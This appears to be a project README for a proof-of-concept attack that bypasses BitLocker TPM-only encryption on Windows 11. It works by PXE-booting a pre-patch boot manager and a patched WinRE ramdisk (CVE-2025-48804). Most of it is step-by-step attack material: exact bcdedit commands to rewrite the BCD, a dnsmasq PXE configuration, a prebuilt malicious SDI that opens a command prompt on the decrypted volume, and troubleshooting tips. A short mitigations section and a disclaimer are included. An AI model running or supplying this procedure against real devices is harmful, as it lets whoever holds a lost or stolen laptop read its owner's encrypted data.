# BitUnlocker Downgrade Attack

A proof of concept for accessing Bitlocker-encrypted disks on fully patched Windows 11 machines through a boot manager downgrade attack, leveraging the SDI vulnerability originally documented as **CVE-2025-48804**. The July 2025 patch fixes this in `bootmgfw.efi`, so any pre-patch `bootmgfw.efi` signed under PCA 2011 can be used for a downgrade attack, provided the target system trusts this PCA.

Unlike Bitpixie, this exploit does not fundamentally rely on PXE — the vulnerability is in the boot manager itself, not in the PXE stack. PXE is simply the most practical delivery method for the old boot manager and the patched SDI. Other approaches are possible, such as directly replacing `bootmgfw.efi` on the EFI partition from a WinRE shell, as long as the replacement is signed with the same certificate currently trusted by the target's Secure Boot policy, changing a few things directly in the target BCD and finding a way to store the custom SDI file somewhere convenient.

This work builds entirely on the research by **Microsoft STORM** (Microsoft Security Blog):
> [BitUnlocker: Leveraging Windows Recovery to Extract BitLocker Secrets](https://techcommunity.microsoft.com/blog/microsoft-security-blog/bitunlocker-leveraging-windows-recovery-to-extract-bitlocker-secrets/4442806)

---

## Prerequisites

- Physical access to a BitLocker-encrypted device (TPM-only, PCR 7 + 11) 
- The device's Secure Boot database still trusts the **Microsoft Windows PCA 2011** certificate
- PXE boot available, or another delivery method for the patched boot manager if you want to dig into it
- A Linux machine with `dnsmasq`, an Ethernet cable, and a USB stick

## Step-by-step

### 1. Download boot_patched.sdi from Releases (or build your own SDI file, see below)

Put it in the `TFTP-root\sdi\` folder 

### 2. Prepare the modified BCD

On the target device, open a WinRE command prompt (hold **Shift** while clicking **Restart**, then **Troubleshoot > Command Prompt** - click "Ignore this disk" when prompted for a Bitlocker recovery key and click "relaunch" if you're also told that the cmd prompt cannot run on a locked device - and if the cmd prompt just won't open, use your own WinPE if you can). Plug in a USB stick and run:

```bat
E: (or wherever your USB is)
bcdedit /export BCD_modded
bcdedit /store BCD_modded /set {default} path \WINDOWS\system32\winload_DOESNOTEXIST.efi
bcdedit /store BCD_modded /enum all
```

In the output, find the entry whose description is **"Windows Recovery"** and which contains `ramdisksdidevice` / `ramdisksdipath` entries. Note its GUID, then:

```bat
bcdedit /store BCD_modded /set {GUID} ramdisksdidevice boot
bcdedit /store BCD_modded /set {GUID} ramdisksdipath \sdi\boot_patched.sdi
move BCD_modded BCD
```

Move the resulting `BCD` file into `TFTP-root/Boot/` on the Linux machine.

### 3. Set up the PXE server

```bash
cd BitUnlocker
export INTERFACE=<your-interface>
export ABS_TFTP_ROOT=$(pwd)/TFTP-root

sudo ifconfig $INTERFACE 10.13.37.1
sudo dnsmasq --no-daemon \
  --interface="$INTERFACE" \
  --dhcp-range=10.13.37.100,10.13.37.101,255.255.255.0,1h \
  --dhcp-boot=bootmgfw.efi \
  --enable-tftp \
  --tftp-root="$ABS_TFTP_ROOT" \
  --log-dhcp \
  --tftp-max=65464 \
  --port=0
```

### 4. Trigger PXE boot

From WinRE select **Use a device > IPv4 Network** (or EFI network, or similar), or press the manufacturer's PXE boot key at power-on (F12 on HP, F9 on some Dell, etc.).

### 5. Wait for the SDI transfer

The target will obtain an IP, download `bootmgfw.efi`, `Boot/BCD`, then `sdi/boot_patched.sdi`. The SDI file is large (~300 MB) so the transfer takes **several minutes**. A recovery-related message with the SDI path should appear on the target screen while it downloads (or any other kind of screen depending on the manufacturer).

### 6. Profit

Once the transfer completes, a command prompt should appear with the OS volume decrypted and mounted (typically `C:` or `E:`).

### Edge cases

| Situation | What happens |
|---|---|
| BitLocker configured with a **PIN** you know | Blue screen at PXE boot — type the PIN blindly and press Enter. Shouldn't work but it did for me once so try your luck |
| Blue screen, no PIN | Target has likely migrated to CA 2023 — press Escape and let the SDI transfer finish anyway, but the Bitlocker-encrypted drive will most likely be locked at the end |
| USB-C / Thunderbolt only | Use a USB-Ethernet adapter |
| TFTP file not found (other than garbage Font files which we don't care about) | File names are case-sensitive — rename `bootmgfw.efi` to match what the target requests |

---

## Build your own SDI file

I've included two scripts in this repo, one enables you to build a modified SDI file from a boot.sdi and a WinRE.wim file, and the other one can be used to parse an SDI file to validate its structure and content. 
The boot_patched.sdi file that I've provided contains a modified WinRE.wim file where the launch app is cmd.exe.

## Unexploitable cases

- **TPM + PIN or TPM + key file** is configured and the attacker doesn't know it (to be confirmed if TPM+PIN is never exploitable even if the attacker knows the PIN)
- **The boot manager has been migrated to CA 2023** — machines freshly installed since early 2026 likely ship with a CA 2023-signed `bootmgfw.efi` by default. To check, mount the EFI partition and inspect the active binary: `mountvol S: /s` then `sigcheck -i S:\EFI\Microsoft\Boot\bootmgfw.efi`. Note that `C:\Windows\Boot\EFI\bootmgfw.efi` may differ from the file actually used at boot — always check the EFI partition copy.
- **Non-default PCR policy** — configurations involving PCR 0, 2, or 4 will detect the change in boot path
- **PCA 2011 revoked via DBX** — if the old certificate has been explicitly distrusted

---

## Mitigations

- **Enable TPM + PIN** — a pre-boot PIN prevents the TPM from unsealing the VMK without user interaction, regardless of boot path manipulation
- **Migrate to Windows UEFI CA 2023** — once the boot manager is signed with the new certificate and PCA 2011 is revoked, downgrade attacks become impossible. See [KB5025885](https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d) for the migration procedure.

---

## Credits

**Microsoft STORM** for the original BitUnlocker research and vulnerability disclosure.

---

## Disclaimer

This repository and all its contents are provided strictly for **authorized security testing and research purposes**. Only use this tool on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The author assumes no liability for any misuse or damage resulting from the use of this material.
